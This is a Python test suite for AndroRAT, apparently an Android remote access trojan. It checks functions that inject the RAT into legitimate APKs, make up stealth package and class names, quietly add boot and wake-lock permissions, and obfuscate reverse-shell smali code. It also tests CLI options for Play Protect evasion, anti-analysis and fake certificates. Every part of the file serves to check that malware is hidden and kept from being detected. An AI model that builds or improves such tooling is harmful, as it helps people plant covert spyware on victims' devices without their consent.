#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Simple APK Injection Test
Tests basic functionality of the APK injection feature
"""

import sys
import os
import tempfile
import shutil

# Add the server directory to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'server'))

from utils import *

def test_injection_functions_exist():
    """Test that all injection functions are properly defined"""
    print(stdOutput("info") + "Testing function definitions...")
    
    required_functions = [
        'extract_apk_info',
        'inject_rat_into_apk', 
        'merge_apk_contents',
        'sign_injected_apk',
        'apply_post_injection_evasion'
    ]
    
    for func_name in required_functions:
        if func_name in globals():
            print(stdOutput("success") + f"Function {func_name} defined ✓")
        else:
            print(stdOutput("error") + f"Function {func_name} missing ✗")
            return False
    
    return True


def test_stealth_functions():
    """Test stealth and evasion helper functions"""
    print(stdOutput("info") + "Testing stealth functions...")
    
    try:
        # Test stealth package name generation
        package_name = generate_stealth_package_name()
        if package_name and len(package_name) > 10:
            print(stdOutput("success") + f"Stealth package generated: {package_name}")
        else:
            print(stdOutput("error") + "Stealth package generation failed")
            return False
        
        # Test class name generation
        stealth_class = get_stealth_class_name("MainActivity.smali")
        if stealth_class != "MainActivity.smali":
            print(stdOutput("success") + f"Stealth class name: {stealth_class}")
        else:
            print(stdOutput("error") + "Stealth class name generation failed")
            return False
        
        return True
        
    except Exception as e:
        print(stdOutput("error") + f"Stealth function test failed: {str(e)}")
        return False


def test_manifest_processing():
    """Test manifest processing functions"""
    print(stdOutput("info") + "Testing manifest processing...")
    
    try:
        # Create a simple test manifest content
        test_manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.testapp">
    
    <uses-permission android:name="android.permission.INTERNET" />
    
    <application android:label="Test App">
        <activity android:name=".MainActivity" />
    </application>
</manifest>'''
        
        # Test permission extraction
        permissions = extract_permissions_from_manifest(test_manifest)
        if "android.permission.INTERNET" in permissions:
            print(stdOutput("success") + "Permission extraction working ✓")
        else:
            print(stdOutput("error") + "Permission extraction failed")
            return False
        
        # Test permission injection
        rat_permissions = ["android.permission.WAKE_LOCK", "android.permission.RECEIVE_BOOT_COMPLETED"]
        modified_manifest = inject_permissions_stealthily(test_manifest, rat_permissions, {})
        
        if "WAKE_LOCK" in modified_manifest and "BOOT_COMPLETED" in modified_manifest:
            print(stdOutput("success") + "Permission injection working ✓")
        else:
            print(stdOutput("error") + "Permission injection failed")
            return False
        
        return True
        
    except Exception as e:
        print(stdOutput("error") + f"Manifest processing test failed: {str(e)}")
        return False


def test_obfuscation_functions():
    """Test obfuscation and stealth functions"""
    print(stdOutput("info") + "Testing obfuscation functions...")
    
    try:
        # Test smali obfuscation
        test_smali_content = '''
.class public Lcom/example/reverseshell2/MainActivity;
.super Landroid/app/Activity;

.method public onCreate(Landroid/os/Bundle;)V
    const-string v0, "shell"
    const-string v1, "tcp"
    return-void
.end method
'''
        
        obfuscated = apply_injection_obfuscation(test_smali_content)
        
        if "system_process" in obfuscated and "network" in obfuscated:
            print(stdOutput("success") + "Smali obfuscation working ✓")
        else:
            print(stdOutput("error") + "Smali obfuscation failed")
            return False
        
        return True
        
    except Exception as e:
        print(stdOutput("error") + f"Obfuscation test failed: {str(e)}")
        return False


def test_cli_arguments():
    """Test CLI argument parsing for injection"""
    print(stdOutput("info") + "Testing CLI argument parsing...")
    
    try:
        import argparse
        
        # Simulate the parser from androRAT.py
        parser = argparse.ArgumentParser()
        parser.add_argument('--build', action='store_true')
        parser.add_argument('--inject', action='store_true')
        parser.add_argument('--target-apk', type=str)
        parser.add_argument('-i', '--ip', type=str)
        parser.add_argument('-p', '--port', type=str)
        parser.add_argument('-o', '--output', type=str)
        parser.add_argument('--stealth', action='store_true')
        parser.add_argument('--random-package', action='store_true')
        parser.add_argument('--anti-analysis', action='store_true')
        parser.add_argument('--play-protect-evasion', action='store_true')
        parser.add_argument('--advanced-obfuscation', action='store_true')
        parser.add_argument('--fake-certificates', action='store_true')
        
        # Test valid injection arguments
        test_args = [
            '--build', '--inject', 
            '--target-apk', '/path/to/target.apk',
            '-i', '192.168.1.100', 
            '-p', '8080', 
            '-o', '/path/to/output.apk',
            '--stealth', '--random-package', '--anti-analysis'
        ]
        
        args = parser.parse_args(test_args)
        
        # Verify all required arguments are parsed correctly
        if (args.build and args.inject and args.target_apk and 
            args.ip and args.port and args.output and
            args.stealth and args.random_package and args.anti_analysis):
            print(stdOutput("success") + "CLI argument parsing working ✓")
            return True
        else:
            print(stdOutput("error") + "CLI argument parsing failed")
            return False
            
    except Exception as e:
        print(stdOutput("error") + f"CLI argument test failed: {str(e)}")
        return False


def test_existing_apk_analysis():
    """Test APK analysis on existing AndroRAT APK"""
    print(stdOutput("info") + "Testing APK analysis on existing files...")
    
    try:
        # Look for existing APK files
        potential_apks = [
            "Android_Code/app/release/app-release.apk",
            "Compiled_apk/../app-release.apk"
        ]
        
        existing_apk = None
        for apk_path in potential_apks:
            if os.path.exists(apk_path):
                existing_apk = apk_path
                break
        
        if existing_apk:
            print(stdOutput("info") + f"Found existing APK: {existing_apk}")
            
            # Test info extraction
            info = extract_apk_info(existing_apk)
            if info:
                print(stdOutput("success") + f"APK analysis successful: {info.get('package_name', 'Unknown')}")
                return True
            else:
                print(stdOutput("warning") + "APK analysis returned no info (may be expected)")
                return True  # Don't fail for this
        else:
            print(stdOutput("info") + "No existing APK found for analysis test")
            return True  # Don't fail if no APK exists
        
    except Exception as e:
        print(stdOutput("warning") + f"APK analysis test warning: {str(e)}")
        return True  # Don't fail for analysis issues


def run_simple_injection_tests():
    """Run simplified injection tests"""
    print(stdOutput("info") + "\033[1m=== Simple APK Injection Tests ===")
    
    tests = [
        ("Function Definitions", test_injection_functions_exist),
        ("Stealth Functions", test_stealth_functions),
        ("Manifest Processing", test_manifest_processing),
        ("Obfuscation Functions", test_obfuscation_functions),
        ("CLI Arguments", test_cli_arguments),
        ("APK Analysis", test_existing_apk_analysis)
    ]
    
    passed = 0
    total = len(tests)
    
    for test_name, test_func in tests:
        print(f"\n{stdOutput('info')}Running {test_name} test...")
        try:
            if test_func():
                print(stdOutput("success") + f"{test_name} test PASSED!")
                passed += 1
            else:
                print(stdOutput("error") + f"{test_name} test FAILED!")
        except Exception as e:
            print(stdOutput("error") + f"{test_name} test ERROR: {str(e)}")
    
    print(f"\n{stdOutput('info')}\033[1m=== Test Results ===")
    print(f"{stdOutput('info')}Tests passed: {passed}/{total}")
    
    if passed >= total - 1:  # Allow 1 test to fail
        print(stdOutput("success") + "\033[1m🎉 APK injection functionality tests PASSED!")
        return True
    else:
        print(stdOutput("error") + f"\033[1m❌ {total - passed} tests FAILED!")
        return False


if __name__ == "__main__":
    # Change to repository root
    os.chdir('/home/runner/work/AndroRAT/AndroRAT')
    
    # Run tests
    success = run_simple_injection_tests()
    sys.exit(0 if success else 1)